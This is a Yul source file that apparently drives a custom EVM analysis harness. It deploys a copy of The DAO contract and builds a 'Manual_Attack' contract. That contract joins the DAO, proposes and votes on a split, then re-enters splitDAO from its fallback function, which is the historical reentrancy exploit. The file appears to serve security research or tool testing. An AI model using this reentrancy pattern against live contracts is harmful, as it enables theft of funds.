object "Deployer" {

    code {

        // Note. Problems with the DAO :
        // - we had to set proposal wait to 15 because if the total time is under 14, it crashes (underflow)
        // - it crashes as its default behaviour
        // - dividing by zero is not just tolerated but intended behaviour
        // - need to call functions to indirectly achieve things,
        // like unblocking by checking if you are blocked;
        // needing to have passing proposals before rewards are not zero;
        // - the logic to do things being spread out all over
        //============ EXECUTABLE CODE ============

        EXT_FUND(123456789000000000000000000) // 123456789 ETH
        PRINT(timestamp())
        PRINT_hex(address())
        
        mstore(64, memoryguard(128))
        let _1 := allocate_unbounded()
        
        // length of 1 word (u256)
        codecopy(_1, dataoffset("DAO_Creator_3051"), datasize("DAO_Creator_3051"))
        
        // create new dao creator: CREATE(value, offset, size)
        let dao_creator_address := create(0, _1, datasize("DAO_Creator_3051"))

        // overwrite the previous object
        codecopy(_1,
            dataoffset("DAO_Creator_3051.DAO_Creator_3051_deployed.DAO_3021"),
            datasize("DAO_Creator_3051.DAO_Creator_3051_deployed.DAO_3021"))

        // add arguments into memory
        let dataEnd := encode_arguments_for_constructor_485_object_DAO_2418(add(_1,32), dao_creator_address)
        let size := sub(dataEnd, _1)
        // create new dao (size is 9 args * 32 + 32 = 320 bytes)
        let dao_address := create(0, _1, size)
        // FIRST WORD (0 to 32): DAO UID, SECOND WORD ONWARDS (32 to 32+192): DAO args.
        // PRINT_hex(dao_address)  // 0x736dbd

        // Deployer joins the DAO: make a call to obtain tokens (calling fallback function)
        let value := 987654321000000   // ETH to send in wei
        let _9 := call(
            gas(),                     // forward all gas
            dao_address,               // address of dao
            value,                     // wei to send
            0,                         // input offset (start of calldata)
            0,                         // input size
            0,                         // output offset
            0                          // output size
        )

        // // 1. MAKE OPPONENT JOIN: make a call to obtain tokens (calling fallback function)
        // value := 9987654321            // ETH to send in wei
        // let success := IMPERSONATECALL(
        //     0x4f505f414444524553535f30,// opponent address
        //     gas(),                     // forward all gas
        //     dao_address,               // address of dao
        //     value,                     // wei to send
        //     0,                         // input offset (start of calldata)
        //     0,                         // input size
        //     0,                         // output offset
        //     0                          // output size
        // )
        // // 2. CHECK BALANCE: make a call to check balance
        // // 0x 70 a0 82 31 (address())
        // let selector := 0x70a08231     // function selector for balanceOf()
        // mstore(_1, shl(224, selector)) // left-align in 32 bytes
        // mstore(add(_1,4), 0x4f505f414444524553535f30)   // store address as argument in memory
        // success := call(
        //     gas(),                     // forward all gas
        //     dao_address,               // address of dao
        //     0,                         // ether to send
        //     _1,                        // input offset (start of calldata)
        //     36,                        // input size (4 + 32 bytes)
        //     0,                         // output offset
        //     32                         // output size
        // )
        // PRINT(mload(0))
        
        // TODO: improve error message...
        // currently: Fatal error: exception Evm_shanghai.Exceptions.EVMError(16). (oh, this was the error)
        // Also improve error message if number of arguments don't match

        // // UNCOMMENT THIS TO RUN THE MANUAL ATTACK
        // codecopy(_1,
        //     dataoffset("Manual_Attack"),
        //     datasize("Manual_Attack"))// overwrite the previous object
        // let manual_attack_address := create(12345678900000000000000, _1, datasize("Manual_Attack"))
        
        // // WAITING for funding period to close before making new proposal
        // WAIT(1296001)
        
        // // CALL the manual attack
        // success := call(
        //     gas(),                     // forward all gas
        //     manual_attack_address,     // address
        //     0,                         // ether to send
        //     _1,                        // input offset (start of calldata)
        //     32,                        // input size (4 + 32 bytes)
        //     0,                         // output offset
        //     0                          // output size
        // )

        let _recipient       := 0x4f505f414444524553535f30
        let _amount          := 0
        let _debatingPeriod  := 604800 // 7 days
        let _newCurator      := 1      // i.e. true => proposal to split DAO

        // // 3. MAKE PROPOSAL FROM OPPONENT: make newProposal
        // let dataEnd1 := encode_call_to_newProposal(_1, _recipient, _amount, _debatingPeriod, _newCurator)
        // let size1 := sub(dataEnd1, _1)

        // let success1 := IMPERSONATECALL(
        //     0x4f505f414444524553535f30,// opponent address
        //     gas(),                     // forward all gas
        //     dao_address,               // address of dao
        //     0,                         // ether to send (has to be zero)
        //     _1,                        // input offset (start of calldata)
        //     size1,                      // input size
        //     0,                         // output offset
        //     32                         // output size
        // )

        
        // UNCOMMENT THIS TO START ANALYSIS
        START_ANALYSIS()
                
        //============ AUXILIARY FUNCTIONS ============
        
        // function to encode the arguments for the constructor for DAO into memory
        function encode_arguments_for_constructor_485_object_DAO_2418(headStart, dao_creator_address)
        -> dataEnd {

            let offset := add(headStart, 192)
            
            // 0. hard coded curator: we may have to add money into this account, or into the deployer
            mstore(add(headStart, 0), 0x908070605040302010)
            // 1. dao creator address
            mstore(add(headStart, 32), dao_creator_address)
            // 2. proposal Deposit: amount of Wei needed to make a proposal
            mstore(add(headStart, 64), 7)
            // 3. min Tokens to Create: min num of tokens required to initiate a dao
            mstore(add(headStart, 96), 10)
            // 4. closing time: deadline; after this time, new DAO instances cannot be created
            mstore(add(headStart, 128), add(timestamp(), 1296000)) // 15 days
            // 5. private creation:
            // - If set, restricts DAO creation to this specific address.
            // - If set to 0x0, the DAO can be created publicly.
            mstore(add(headStart, 160), 0x0)

            dataEnd := offset

        }

        // function to encode the arguments for newProposal().
        function encode_call_to_newProposal(headStart, _recipient, _amount,
            _debatingPeriod, _newCurator)
        -> dataEnd {
            let selector := 0x612e45a3  // selector for newProposal()
            mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

            // Head starts after selector
            let head := add(headStart, 4)

            // argument offsets
            // 0: _recipient (address)
            // 1: _amount (uint)
            // 2: _description (string, dynamic)
            // 3: _transactionData (bytes, dynamic)
            // 4: _debatingPeriod (uint)
            // 5: _newCurator (bool)

            // write static args
            mstore(add(head, 0), _recipient)        // address -> padded to 32 bytes
            mstore(add(head, 32), _amount)          // uint
            mstore(add(head, 64), 192)              // offset to _description
            mstore(add(head, 96), 256)              // offset to _transactionData
            mstore(add(head, 128), _debatingPeriod) // uint
            mstore(add(head, 160), _newCurator)     // bool (padded)

            // dynamic area starts at head + 192
            let tail := add(head, 192)

            // --- _description ---
            let descLen := 11
            mstore(tail, descLen)
            // "lonely, so lonely"
            mstore(add(tail, 32), 0x6c6f6e656c792c20736f206c6f6e656c79000000000000000000000000000000)
            tail := add(tail, 64)

            // --- _transactionData ---
            let txLen := 0
            mstore(tail, txLen)
            mstore(add(tail, 32), 0x0000000000000000000000000000000000000000000000000000000000000000)
            tail := add(tail, 64)

            dataEnd := tail
        }

        
        function allocate_unbounded() -> memPtr {
            memPtr := mload(64)
        }
        
    }

    ////////////////////////////////////////////////////////////////////////////////
    ////////////////    START OF OBJECTS TO PERFORM MANUAL ATTACK    ///////////////
    ////////////////////////////////////////////////////////////////////////////////
    
    object "Manual_Attack" {
        code {
            sstore(0,0)
            mstore(64, memoryguard(128))
            let _1 := allocate_unbounded()
            let dao_address := 0x736dbd

            PRINT(11111111111111111111111111111111111)
            // 1. JOIN: make a call to obtain tokens (calling fallback function)
            let value := 1234567890        // ETH to send in wei
            let success := call(
                gas(),                     // forward all gas
                dao_address,               // address of dao
                value,                     // wei to send
                0,                         // input offset (start of calldata)
                0,                         // input size
                0,                         // output offset
                0                          // output size
            )

            PRINT(22222222222222222222222222222222222)
            // 2. CHECK BALANCE: make a call to check balance
            // 0x 70 a0 82 31 (address())
            let selector := 0x70a08231     // function selector for balanceOf()
            mstore(_1, shl(224, selector)) // left-align in 32 bytes
            mstore(add(_1,4), address())   // store address as argument in memory
            success := call(
                gas(),                     // forward all gas
                dao_address,               // address of dao
                0,                         // ether to send
                _1,                        // input offset (start of calldata)
                36,                        // input size (4 + 32 bytes)
                0,                         // output offset
                32                         // output size
            )
            PRINT(mload(0))

            // Return deployed object
            datacopy(0, dataoffset("Manual_Attack_deployed"), datasize("Manual_Attack_deployed"))
            return(0, datasize("Manual_Attack_deployed"))

            function allocate_unbounded() -> memPtr {
                memPtr := mload(64)
            }

        }

        /////////////////////////////////////////////////////////////
        
        object "Manual_Attack_deployed" {
            code {

                mstore(64, memoryguard(128))
                let _1 := allocate_unbounded()
                let dao_address := 0x736dbd
                let _recipient       := address()
                let _amount          := 0
                let _debatingPeriod  := 604800 // 7 days
                let _newCurator      := 1      // i.e. true => proposal to split DAO

                if iszero(lt(calldatasize(), 4)) {
                    
                    PRINT(3333333333333333333333333333333333333)
                    // 3. MAKE PROPOSAL: make newProposal
                    let dataEnd :=
                            encode_call_to_newProposal(_1, _recipient, _amount, _debatingPeriod, _newCurator)
                    
                    let size := sub(dataEnd, _1)
                    let success := call(
                        gas(),                     // forward all gas
                        dao_address,               // address of dao
                        0,                         // ether to send (has to be zero)
                        _1,                        // input offset (start of calldata)
                        size,                      // input size
                        0,                         // output offset
                        32                         // output size
                    )
                    let p1 := mload(0)
                    PRINT(p1)
                    
                    PRINT(444444444444444444444444444444444)
                    // 4. VOTE: call vote()
                    dataEnd := encode_call_to_vote(_1, 1, p1)
                    size := sub(dataEnd, _1)
                    success := call(
                        gas(),                     // forward all gas
                        dao_address,               // address of dao
                        0,                         // ether to send (has to be zero)
                        _1,                        // input offset (start of calldata)
                        size,                      // input size
                        0,                         // output offset
                        0                          // output size
                    )
                    PRINT(success)

                    // // WAITING for proposal debating period to end
                    // WAIT(_debatingPeriod)

                    // PRINT(55555555555555555555555555555555555)
                    // // Unblock Me
                    // // let selector := 0x2632bf20     // selector for newProposal()
                    // // mstore(_1, shl(224, selector)) // store the 4-byte selector in first word                
                    // // success := call(
                    // //     gas(),                     // forward all gas
                    // //     dao_address,               // address of dao
                    // //     0,                         // ether to send (has to be zero)
                    // //     _1,                        // input offset (start of calldata)
                    // //     32,                        // input size
                    // //     0,                         // output offset
                    // //     32                         // output size
                    // // )
                    
                    // PRINT(66666666666666666666666666666666666)
                    // // Split DAO
                    // let _newCuratorAddress := _recipient
                    // dataEnd := encode_call_to_splitDAO(_1, p1, _newCuratorAddress)
                    // size := sub(dataEnd, _1)
                    // success := call(
                    //     gas(),                     // forward all gas
                    //     dao_address,               // address of dao
                    //     0,                         // ether to send (has to be zero)
                    //     _1,                        // input offset (start of calldata)
                    //     size,                      // input size
                    //     0,                         // output offset
                    //     32                         // output size
                    // )
                    // let did_p1_pass := mload(0)
                    // PRINT(did_p1_pass)

                    // /// END OF ATTACK SETUP
                    // PRINT_hex(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
                    stop()
                }

                //Fallback: triggered on receiving ETH or unknown calls
                PRINT(999999999999999999999999999999999999999999999999999999999)
                
                // INCREMENT COUNTER
                sstore(0,add(sload(0),1))
                let proposal1 := 1 // should be p1, but p1 is in the IF condition above
                if lt(sload(0),4) {
                    let _newCuratorAddress0 := _recipient
                    let dataEnd1 := encode_call_to_splitDAO(_1, proposal1, _newCuratorAddress0)
                    let size1 := sub(dataEnd1, _1)
                    let success := call(
                        gas(),                     // forward all gas
                        dao_address,               // address of dao
                        0,                         // ether to send (has to be zero)
                        _1,                        // input offset (start of calldata)
                        size1,                     // input size
                        0,                         // output offset
                        32                         // output size
                    )
                }
                stop()

                
                //============ AUXILIARY FUNCTIONS ============

                // function to encode the arguments for newProposal().
                function encode_call_to_newProposal(headStart, _recipient, _amount,
                    _debatingPeriod, _newCurator)
                -> dataEnd {
                    let selector := 0x612e45a3  // selector for newProposal()
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // argument offsets
                    // 0: _recipient (address)
                    // 1: _amount (uint)
                    // 2: _description (string, dynamic)
                    // 3: _transactionData (bytes, dynamic)
                    // 4: _debatingPeriod (uint)
                    // 5: _newCurator (bool)

                    // write static args
                    mstore(add(head, 0), _recipient)        // address -> padded to 32 bytes
                    mstore(add(head, 32), _amount)          // uint
                    mstore(add(head, 64), 192)              // offset to _description
                    mstore(add(head, 96), 256)              // offset to _transactionData
                    mstore(add(head, 128), _debatingPeriod) // uint
                    mstore(add(head, 160), _newCurator)     // bool (padded)

                    // dynamic area starts at head + 192
                    let tail := add(head, 192)

                    // --- _description ---
                    let descLen := 11
                    mstore(tail, descLen)
                    // "lonely, so lonely"
                    mstore(add(tail, 32), 0x6c6f6e656c792c20736f206c6f6e656c79000000000000000000000000000000)
                    tail := add(tail, 64)

                    // --- _transactionData ---
                    let txLen := 0
                    mstore(tail, txLen)
                    mstore(add(tail, 32), 0x0000000000000000000000000000000000000000000000000000000000000000)
                    tail := add(tail, 64)

                    dataEnd := tail
                }

                // function to encode the arguments for vote().
                function encode_call_to_vote(headStart, _proposalID, _supportsProposal)
                -> dataEnd {
                    let selector := 0xc9d27afe  // selector for vote()
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // argument offsets
                    // 0: _proposalID (uint)
                    // 1: _supportsProposal (bool)

                    // write static args
                    mstore(add(head, 0), _proposalID)        // uint
                    mstore(add(head, 32), _supportsProposal) // bool (padded)

                    // dynamic area starts at head + 64
                    let tail := add(head, 64)

                    dataEnd := tail
                }

                // function to encode the arguments for executeProposal()
                function encode_call_to_splitDAO(headStart, _proposalID, _newCurator)
                -> dataEnd {
                    let selector := 0x82661dc4  // selector for splitDAO(uint256,address)
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // ABI layout:
                    // 0: _proposalID (uint)
                    // 1: _newCurator (address)

                    // write static args
                    mstore(add(head, 0), _proposalID)
                    mstore(add(head, 32), _newCurator)

                    // tail starts after head + 64 bytes
                    let tail := add(head, 64)

                    dataEnd := tail
                }
                
                function allocate_unbounded() -> memPtr {
                    memPtr := mload(64)
                }
                
            }
        }
    }


    /////////////////////////////////////////////////////////////////////////////////////////
    ////////////////    START OF OBJECTS TO PERFORM NON-SPLITTING PROPOSAL    ///////////////
    /////////////////////////////////////////////////////////////////////////////////////////
    
    object "Nonsplit_Proposal" {
        code {
            sstore(0,0)
            mstore(64, memoryguard(128))
            let _1 := allocate_unbounded()
            let dao_address := 0x736dbd

            PRINT(11111111111111111111111111111111111)
            // 1. JOIN: make a call to obtain tokens (calling fallback function)
            let value := 123456789000      // ETH to send in wei
            let success := call(
                gas(),                     // forward all gas
                dao_address,               // address of dao
                value,                     // wei to send
                0,                         // input offset (start of calldata)
                0,                         // input size
                0,                         // output offset
                0                          // output size
            )

            PRINT(22222222222222222222222222222222222)
            // 2. CHECK BALANCE: make a call to check balance
            // 0x 70 a0 82 31 (address())
            let selector := 0x70a08231     // function selector for balanceOf()
            mstore(_1, shl(224, selector)) // left-align in 32 bytes
            mstore(add(_1,4), address())   // store address as argument in memory
            success := call(
                gas(),                     // forward all gas
                dao_address,               // address of dao
                0,                         // ether to send
                _1,                        // input offset (start of calldata)
                36,                        // input size (4 + 32 bytes)
                0,                         // output offset
                32                         // output size
            )
            PRINT(mload(0))

            // Return deployed object
            datacopy(0, dataoffset("Nonsplit_Proposal_deployed"), datasize("Nonsplit_Proposal_deployed"))
            return(0, datasize("Nonsplit_Proposal_deployed"))

            function allocate_unbounded() -> memPtr {
                memPtr := mload(64)
            }
        }

        /////////////////////////////////////////////////////////////
        
        object "Nonsplit_Proposal_deployed" {
            code {

                if iszero(lt(calldatasize(), 4)) {
                    PRINT(sload(0))
                    
                    mstore(64, memoryguard(128))
                    let _1 := allocate_unbounded()
                    let dao_address := 0x736dbd


                    // WAITING for funding period to close before making new proposal
                    WAIT(1296001)

                    PRINT(3333333333333333333333333333333333333)
                    // 3. MAKE PROPOSAL: make newProposal
                    let _recipient       := address()
                    let _amount          := 0
                    let _debatingPeriod  := 604800 // 7 days
                    let _newCurator      := 1      // i.e. true => proposal to split DAO
                    let dataEnd :=
                            encode_call_to_newProposal(_1, _recipient, _amount, _debatingPeriod, _newCurator)
                    
                    let size := sub(dataEnd, _1)
                    success := call(
                        gas(),                     // forward all gas
                        dao_address,               // address of dao
                        0,                         // ether to send (has to be zero)
                        _1,                        // input offset (start of calldata)
                        size,                      // input size
                        0,                         // output offset
                        32                         // output size
                    )
                    let p1 := mload(0)
                    PRINT(p1)
                    
                    PRINT(444444444444444444444444444444444)
                    // 4. VOTE: call vote()
                    dataEnd := encode_call_to_vote(_1, 1, p1)
                    size := sub(dataEnd, _1)
                    success := call(
                        gas(),                     // forward all gas
                        dao_address,               // address of dao
                        0,                         // ether to send (has to be zero)
                        _1,                        // input offset (start of calldata)
                        size,                      // input size
                        0,                         // output offset
                        0                          // output size
                    )
                    PRINT(success)

                    // // WAITING for proposal debating period to end
                    // WAIT(_debatingPeriod)

                    // PRINT(55555555555555555555555555555555555)
                    // // Unblock Me
                    // selector := 0x2632bf20     // selector for newProposal()
                    // mstore(_1, shl(224, selector)) // store the 4-byte selector in first word                
                    // success := call(
                    //     gas(),                     // forward all gas
                    //     dao_address,               // address of dao
                    //     0,                         // ether to send (has to be zero)
                    //     _1,                        // input offset (start of calldata)
                    //     32,                        // input size
                    //     0,                         // output offset
                    //     32                         // output size
                    // )
                    
                    // PRINT(66666666666666666666666666666666666)
                    // // Split DAO
                    // let _newCuratorAddress := _recipient
                    // dataEnd := encode_call_to_splitDAO(_1, p1, _newCuratorAddress)
                    // size := sub(dataEnd, _1)
                    // success := call(
                    //     gas(),                     // forward all gas
                    //     dao_address,               // address of dao
                    //     0,                         // ether to send (has to be zero)
                    //     _1,                        // input offset (start of calldata)
                    //     size,                      // input size
                    //     0,                         // output offset
                    //     32                         // output size
                    // )
                    // let did_p1_pass := mload(0)
                    // PRINT(did_p1_pass)
                    // //Fallback: triggered on receiving ETH or unknown calls
                    // PRINT(callvalue())
                }

                
                stop()

                
                //============ AUXILIARY FUNCTIONS ============

                // function to encode the arguments for newProposal().
                function encode_call_to_newProposal(headStart, _recipient, _amount,
                    _debatingPeriod, _newCurator)
                -> dataEnd {
                    let selector := 0x612e45a3  // selector for newProposal()
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // argument offsets
                    // 0: _recipient (address)
                    // 1: _amount (uint)
                    // 2: _description (string, dynamic)
                    // 3: _transactionData (bytes, dynamic)
                    // 4: _debatingPeriod (uint)
                    // 5: _newCurator (bool)

                    // write static args
                    mstore(add(head, 0), _recipient)        // address -> padded to 32 bytes
                    mstore(add(head, 32), _amount)          // uint
                    mstore(add(head, 64), 192)              // offset to _description
                    mstore(add(head, 96), 256)              // offset to _transactionData
                    mstore(add(head, 128), _debatingPeriod) // uint
                    mstore(add(head, 160), _newCurator)     // bool (padded)

                    // dynamic area starts at head + 192
                    let tail := add(head, 192)

                    // --- _description ---
                    let descLen := 11
                    mstore(tail, descLen)
                    // "lonely, so lonely"
                    mstore(add(tail, 32), 0x6c6f6e656c792c20736f206c6f6e656c79000000000000000000000000000000)
                    tail := add(tail, 64)

                    // --- _transactionData ---
                    let txLen := 0
                    mstore(tail, txLen)
                    mstore(add(tail, 32), 0x0000000000000000000000000000000000000000000000000000000000000000)
                    tail := add(tail, 64)

                    dataEnd := tail
                }

                // function to encode the arguments for vote().
                function encode_call_to_vote(headStart, _proposalID, _supportsProposal)
                -> dataEnd {
                    let selector := 0xc9d27afe  // selector for vote()
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // argument offsets
                    // 0: _proposalID (uint)
                    // 1: _supportsProposal (bool)

                    // write static args
                    mstore(add(head, 0), _proposalID)        // uint
                    mstore(add(head, 32), _supportsProposal) // bool (padded)

                    // dynamic area starts at head + 64
                    let tail := add(head, 64)

                    dataEnd := tail
                }

                // function to encode the arguments for executeProposal()
                function encode_call_to_splitDAO(headStart, _proposalID, _newCurator)
                -> dataEnd {
                    let selector := 0x82661dc4  // selector for splitDAO(uint256,address)
                    mstore(headStart, shl(224, selector)) // store the 4-byte selector in first word

                    // Head starts after selector
                    let head := add(headStart, 4)

                    // ABI layout:
                    // 0: _proposalID (uint)
                    // 1: _newCurator (address)

                    // write static args
                    mstore(add(head, 0), _proposalID)
                    mstore(add(head, 32), _newCurator)

                    // tail starts after head + 64 bytes
                    let tail := add(head, 64)

                    dataEnd := tail
                }
                
                function allocate_unbounded() -> memPtr {
                    memPtr := mload(64)
                }
                
            }
        }
    }














    



    
    ///////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////// START OF THE DAO OBJECTS///////////////////////////// 
    ///////////////////////////////////////////////////////////////////////////////////

    
    /// @use-src 0:"DAO_from_etherscan_translated.sol"
    object "DAO_Creator_3051" {
        code {
            /// @src 0:47044:47451  "contract DAO_Creator {..."
            mstore(64, memoryguard(128))
            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }

            constructor_DAO_Creator_3051()

            let _1 := allocate_unbounded()
            codecopy(_1, dataoffset("DAO_Creator_3051_deployed"), datasize("DAO_Creator_3051_deployed"))

            return(_1, datasize("DAO_Creator_3051_deployed"))

            function allocate_unbounded() -> memPtr {
                memPtr := mload(64)
            }

            function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                revert(0, 0)
            }

            /// @src 0:47044:47451  "contract DAO_Creator {..."
            function constructor_DAO_Creator_3051() {

                /// @src 0:47044:47451  "contract DAO_Creator {..."

            }
            /// @src 0:47044:47451  "contract DAO_Creator {..."

        }
        /// @use-src 0:"DAO_from_etherscan_translated.sol"
        object "DAO_Creator_3051_deployed" {
            code {
                /// @src 0:47044:47451  "contract DAO_Creator {..."
                mstore(64, memoryguard(128))

                if iszero(lt(calldatasize(), 4))
                {
                    let selector := shift_right_224_unsigned(calldataload(0))
                    switch selector

                    case 0xe2faf044
                    {
                        // createDAO(address,uint256,uint256,uint256)

                        external_fun_createDAO_3050()
                    }

                    default {}
                }

                revert_error_42b3090547df1d2001c96683413b8cf91c1b902ef5e3cb8d9f6f304cf7446f74()

                function shift_right_224_unsigned(value) -> newValue {
                    newValue :=

                    shr(224, value)

                }

                function allocate_unbounded() -> memPtr {
                    memPtr := mload(64)
                }

                function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                    revert(0, 0)
                }

                function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {
                    revert(0, 0)
                }

                function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {
                    revert(0, 0)
                }

                function cleanup_t_uint160(value) -> cleaned {
                    cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                }

                function cleanup_t_address(value) -> cleaned {
                    cleaned := cleanup_t_uint160(value)
                }

                function validator_revert_t_address(value) {
                    if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
                }

                function abi_decode_t_address(offset, end) -> value {
                    value := calldataload(offset)
                    validator_revert_t_address(value)
                }

                function cleanup_t_uint256(value) -> cleaned {
                    cleaned := value
                }

                function validator_revert_t_uint256(value) {
                    if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }
                }

                function abi_decode_t_uint256(offset, end) -> value {
                    value := calldataload(offset)
                    validator_revert_t_uint256(value)
                }

                function abi_decode_tuple_t_addresst_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2, value3 {
                    if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                    {

                        let offset := 0

                        value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                    }

                    {

                        let offset := 32

                        value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                    }

                    {

                        let offset := 64

                        value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                    }

                    {

                        let offset := 96

                        value3 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                    }

                }

                function identity(value) -> ret {
                    ret := value
                }

                function convert_t_uint160_to_t_uint160(value) -> converted {
                    converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))
                }

                function convert_t_uint160_to_t_address(value) -> converted {
                    converted := convert_t_uint160_to_t_uint160(value)
                }

                function convert_t_contract$_DAO_$3021_to_t_address(value) -> converted {
                    converted := convert_t_uint160_to_t_address(value)
                }

                function abi_encode_t_contract$_DAO_$3021_to_t_address_fromStack(value, pos) {
                    mstore(pos, convert_t_contract$_DAO_$3021_to_t_address(value))
                }

                function abi_encode_tuple_t_contract$_DAO_$3021__to_t_address__fromStack(headStart , value0) -> tail {
                    tail := add(headStart, 32)

                    abi_encode_t_contract$_DAO_$3021_to_t_address_fromStack(value0,  add(headStart, 0))

                }

                function external_fun_createDAO_3050() {

                    if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                    let param_0, param_1, param_2, param_3 :=  abi_decode_tuple_t_addresst_uint256t_uint256t_uint256(4, calldatasize())
                    let ret_0 :=  fun_createDAO_3050(param_0, param_1, param_2, param_3)
                    let memPos := allocate_unbounded()
                    let memEnd := abi_encode_tuple_t_contract$_DAO_$3021__to_t_address__fromStack(memPos , ret_0)
                    return(memPos, sub(memEnd, memPos))

                }

                function revert_error_42b3090547df1d2001c96683413b8cf91c1b902ef5e3cb8d9f6f304cf7446f74() {
                    revert(0, 0)
                }

                function zero_value_for_split_t_contract$_DAO_$3021() -> ret {
                    ret := 0
                }

                function panic_error_0x41() {
                    mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                    mstore(4, 0x41)
                    revert(0, 0x24)
                }

                function abi_encode_t_address_to_t_address_fromStack(value, pos) {
                    mstore(pos, cleanup_t_address(value))
                }

                function convert_t_contract$_DAO_Creator_$3051_to_t_address(value) -> converted {
                    converted := convert_t_uint160_to_t_address(value)
                }

                function abi_encode_t_contract$_DAO_Creator_$3051_to_t_address_fromStack(value, pos) {
                    mstore(pos, convert_t_contract$_DAO_Creator_$3051_to_t_address(value))
                }

                function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {
                    mstore(pos, cleanup_t_uint256(value))
                }

                function abi_encode_tuple_t_address_t_contract$_DAO_Creator_$3051_t_uint256_t_uint256_t_uint256_t_address__to_t_address_t_address_t_uint256_t_uint256_t_uint256_t_address__fromStack(headStart , value0, value1, value2, value3, value4, value5) -> tail {
                    tail := add(headStart, 192)

                    abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                    abi_encode_t_contract$_DAO_Creator_$3051_to_t_address_fromStack(value1,  add(headStart, 32))

                    abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))

                    abi_encode_t_uint256_to_t_uint256_fromStack(value3,  add(headStart, 96))

                    abi_encode_t_uint256_to_t_uint256_fromStack(value4,  add(headStart, 128))

                    abi_encode_t_address_to_t_address_fromStack(value5,  add(headStart, 160))

                }

                function revert_forward_1() {
                    let pos := allocate_unbounded()
                    //returndatacopy(pos, 0, returndatasize())
                    revert(pos, returndatasize())
                }

                /// @ast-id 3050
                /// @src 0:47071:47449  "function createDAO(..."
                function fun_createDAO_3050(var__curator_3023, var__proposalDeposit_3025, var__minTokensToCreate_3027, var__closingTime_3029) -> var__newDAO_3033_address {
                    /// @src 0:47229:47240  "DAO _newDAO"
                    let zero_t_contract$_DAO_$3021_1_address := zero_value_for_split_t_contract$_DAO_$3021()
                    var__newDAO_3033_address := zero_t_contract$_DAO_$3021_1_address

                    /// @src 0:47281:47289  "_curator"
                    let _2 := var__curator_3023
                    let expr_3038 := _2
                    /// @src 0:47315:47319  "this"
                    let expr_3040_address := address()
                    /// @src 0:47303:47320  "DAO_Creator(this)"
                    let expr_3041_address := expr_3040_address
                    /// @src 0:47334:47350  "_proposalDeposit"
                    let _3 := var__proposalDeposit_3025
                    let expr_3042 := _3
                    /// @src 0:47364:47382  "_minTokensToCreate"
                    let _4 := var__minTokensToCreate_3027
                    let expr_3043 := _4
                    /// @src 0:47396:47408  "_closingTime"
                    let _5 := var__closingTime_3029
                    let expr_3044 := _5
                    /// @src 0:47422:47432  "msg.sender"
                    let expr_3046 := caller()
                    /// @src 0:47260:47442  "new DAO(..."
                    let _6 := allocate_unbounded()
                    let _7 := add(_6, datasize("DAO_3021"))
                    if or(gt(_7, 0xffffffffffffffff), lt(_7, _6)) { panic_error_0x41() }
                    datacopy(_6, dataoffset("DAO_3021"), datasize("DAO_3021"))
                    _7 := abi_encode_tuple_t_address_t_contract$_DAO_Creator_$3051_t_uint256_t_uint256_t_uint256_t_address__to_t_address_t_address_t_uint256_t_uint256_t_uint256_t_address__fromStack(_7, expr_3038, expr_3041_address, expr_3042, expr_3043, expr_3044, expr_3046)

                    let expr_3047_address := create(0, _6, sub(_7, _6))

                    if iszero(expr_3047_address) { revert_forward_1() }

                    /// @src 0:47253:47442  "return new DAO(..."
                    var__newDAO_3033_address := expr_3047_address
                    leave

                }
                /// @src 0:47044:47451  "contract DAO_Creator {..."

            }

            /// @use-src 0:"DAO_from_etherscan_translated.sol"
            object "DAO_3021" {
                code {
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."
                    mstore(64, memoryguard(128))
                    if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }

                    let _1, _2, _3, _4, _5, _6 := copy_arguments_for_constructor_1172_object_DAO_3021()
                    constructor_DAO_3021(_1, _2, _3, _4, _5, _6)

                    let _7 := allocate_unbounded()
                    codecopy(_7, dataoffset("DAO_3021_deployed"), datasize("DAO_3021_deployed"))

                    return(_7, datasize("DAO_3021_deployed"))

                    function allocate_unbounded() -> memPtr {
                        memPtr := mload(64)
                    }

                    function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                        revert(0, 0)
                    }

                    function round_up_to_mul_of_32(value) -> result {
                        result := and(add(value, 31), not(31))
                    }

                    function panic_error_0x41() {
